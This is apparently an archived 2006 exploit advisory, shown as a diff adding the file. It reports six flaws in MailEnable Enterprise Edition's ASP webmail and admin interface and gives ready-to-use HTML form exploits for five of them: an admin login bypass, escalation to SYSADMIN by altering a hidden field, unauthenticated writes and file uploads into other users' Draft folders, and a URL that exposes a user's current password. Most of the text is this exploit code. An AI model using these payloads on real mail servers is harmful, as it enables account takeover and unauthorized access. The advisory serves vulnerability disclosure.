@@ -1,0 +1,138 @@
+Hi, I'm Soroush Dalili from GrayHatz Security Group (GSG). I found multiple bugs in 
+MailEnable Enterprise Edition ASP Version <= 2.0 that I listed them below:
+
+1) - Any user can login to web administration site.
+2) - Authenticated normal user can gain ADMIN or SYSADMIN level, also remote user can disable him/her account!
+3) - Every one (ever no authenticated user) can write a message in "Draft" folder of any users!
+4) - Every one can make "myupload.ams" on server in "drafts" folder of every user!
+5) - Every one can make "_myupload.csv" on server in "drafts" folder of every user!
+6) - For changing password it need the current password but current password is mention in source of "ListAttachments.asp" file, if XSS attack or Session hijacking happened then attacker can gain the user's current password.
+
+
+
+Details' Descriptions:
+
+1)
+Any user can login to web administration site with bug in "main.asp" (Enterprise)
+
+Proof's exploit:
+-----------------------Start--------------------------
+<FORM NAME=FrmMain ACTION="http://[URL]/meadmin/enterprise/lang/EN/main.asp" METHOD="POST">
+	POSTOFFICE<INPUT NAME=POSTOFFICE TYPE="text" VALUE="postmaster"><br>
+<input type=submit>
+</FORM>
+-----------------------End----------------------------
+
+2)
+Authenticated normal user can gain ADMIN or SYSADMIN level, also remote user can disable him/her account!
+
+Bug in "MailOptions.asp" file: remote authenticated user can change value of hidden field (name="LoginRights") 
+from "USER" to "ADMIN" or "SYSADMIN" and change it's level to up! or change value of hidden field 
+(name="LoginStatus") to "0" to disable him/her account!
+
+Proof's exploit:
+-----------------------Start--------------------------
+<FORM METHOD="post" ACTION="http://[URL]/MEWebMail/base/default/lang/EN/MailOptions.asp?SelectedIndex=1&FormAction=Edit">
+
+<TABLE BORDER="0">
+	<TR><TD>Current Password:</TD><TD><INPUT name=LoginPassword VALUE=""></TD></TR>
+	<TR><TD>New Password:</TD><TD><INPUT name=NewLoginPassword VALUE=""></TD></TR>
+	<TR><TD>Confirm New Password:</TD><TD><INPUT name=ConfirmNewLoginPassword VALUE=""></TD></TR>
+</TABLE>
+<INPUT NAME="LoginDescription" VALUE="Login description">
+<INPUT NAME="LoginRights" VALUE="SYSADMIN">
+<INPUT NAME="LoginStatus" VALUE="1">
+<BR><BR>
+<INPUT type=submit value="UpTime!">
+</FORM>
+-----------------------End----------------------------
+
+3)
+Every one (ever no authenticated user) can write a message in "Draft" folder of any users!
+Bug in "Resolve.asp" file: this file don't check authenticated user!
+
+Proof's exploit:
+--------------Start---------------------
+<FORM METHOD="post" ACTION="http://[url]/MEWebMail/base/default/lang/EN/Forms/MAI/Resolve.asp">
+
+<TABLE BORDER="0">
+	<TR><TD>ME_MAILBOX:</TD><TD><INPUT name=ME_MAILBOX VALUE=""></TD></TR>
+	<TR><TD>ME_POSTOFFICE:</TD><TD><INPUT name=ME_POSTOFFICE VALUE=""></TD></TR>
+	<TR><TD>Folder:</TD><TD><INPUT name=Folder VALUE=""></TD></TR>
+	<TR><TD>ID:</TD><TD><INPUT name=ID VALUE=""></TD></TR>
+	<TR><TD>ComposeMode:</TD><TD><INPUT name=ComposeMode VALUE="General"></TD></TR>	
+	<TR><TD>MsgFrom:</TD><TD><INPUT name=MsgFrom VALUE=""></TD></TR>
+	<TR><TD>MsgCc:</TD><TD><INPUT name=MsgCc VALUE=""></TD></TR>
+	<TR><TD>MsgTo:</TD><TD><INPUT name=MsgTo VALUE=""></TD></TR>
+	<TR><TD>MsgBCC:</TD><TD><INPUT name=MsgBCC VALUE=""></TD></TR>
+	<TR><TD>MsgBody:</TD><TD><INPUT name=MsgBody VALUE=""></TD></TR>
+	<TR><TD>MsgSubject:</TD><TD><INPUT name=MsgSubject VALUE=""></TD></TR>
+</TABLE>
+<BR><BR>
+<INPUT type=submit value="Update"  CLASS=ME_Button>
+</FORM>
+--------------End---------------------
+
+4)
+Make "myupload.ams" on server in "drafts" folder of every user!
+Show Mail Enable folder's path if "username" or "postoffices" be incorrect!
+
+Proof's exploit:
+-----------------------Start--------------------------
+<FORM NAME=FrmMain ACTION="http://[URL]/MEWebMail/base/default/lang/EN/Forms/MAI/UploadAttachment.asp" ENCTYPE="multipart/form-data" METHOD="POST">
+	MESSAGEID<INPUT NAME=MESSAGEID TYPE="text" VALUE="test"><br>
+	POSTOFFICE<INPUT NAME=POSTOFFICE TYPE="text" VALUE="default"><br>
+	AUTH_PASSWORD<INPUT NAME=AUTH_PASSWORD TYPE="text" VALUE=""><br>
+	AUTH_USERNAME<INPUT NAME=AUTH_USERNAME TYPE="text" VALUE="testuser"><br>
+	Mode<INPUT NAME=Mode TYPE="text" VALUE="Compose"><br>
+	Folder<INPUT NAME=Folder TYPE="text" VALUE="\Drafts"><br>
+	ID<INPUT NAME=ID TYPE="text" VALUE="test"><br>
+<TABLE>
+<TR><TD>File Name</TD><TD>
+<INPUT TYPE=FILE NAME="txtFile">
+<INPUT TYPE=submit VALUE="Add"></TD></TR>
+</TABLE>
+</FORM>
+-----------------------End----------------------------
+
+5)
+Make "_myupload.csv" on server in "drafts" folder of every user!
+Show Mail Enable folder's path if "username" or "postoffices" be incorrect!
+Proof's exploit:
+-----------------------Start--------------------------
+<FORM NAME=FrmMain ACTION="http://[URL]/MEWebMail/base/enterprise/lang/EN/Forms/vcf/uploadcontact.asp" ENCTYPE="multipart/form-data" METHOD="POST">
+	MESSAGEID<INPUT NAME=MESSAGEID TYPE="text" VALUE="test123"><br>
+	POSTOFFICE<INPUT NAME=POSTOFFICE TYPE="text" VALUE="default"><br>
+	AUTH_PASSWORD<INPUT NAME=AUTH_PASSWORD TYPE="text" VALUE=""><br>
+	AUTH_USERNAME<INPUT NAME=AUTH_USERNAME TYPE="text" VALUE="testuser"><br>
+	Mode<INPUT NAME=Mode TYPE="text" VALUE="Compose"><br>
+	Folder<INPUT NAME=Folder TYPE="text" VALUE="\Drafts"><br>
+	ID<INPUT NAME=ID TYPE="text" VALUE="test123"><br>
+<TABLE>
+<TR><TD>File Name</TD><TD>
+<INPUT TYPE=FILE NAME="txtFile">
+<INPUT TYPE=submit VALUE="Add"></TD></TR>
+</TABLE>
+</FORM>
+-----------------------End----------------------------
+
+6)
+Have password in source.
+Proof:
+-----------------------Start--------------------------
+http://[URL]/MEWebmail/base/enterprise/lang/EN/Forms/MAI/ListAttachments.asp?Mode=Compose&ID=test.MAI&MsgFormat=HTML&FormAction=Send&ComposeMode=General&Folder=%5CDrafts
+-----------------------End----------------------------
+
+
+Product name: MailEnable Enterprise Edition
+Version: All ASP version <= 2.0
+URL: www.mailenable.com
+Finder: Soroush Dalili
+Team: GSG [Grayhatz.net]
+Country: Iran
+Site: Grayhatz.net
+Email: IRSDL[a.t]Yahoo[d0t]Com
+
+<< I hope secure world for all >>
+
+# milw0rm.com [2006-06-09]
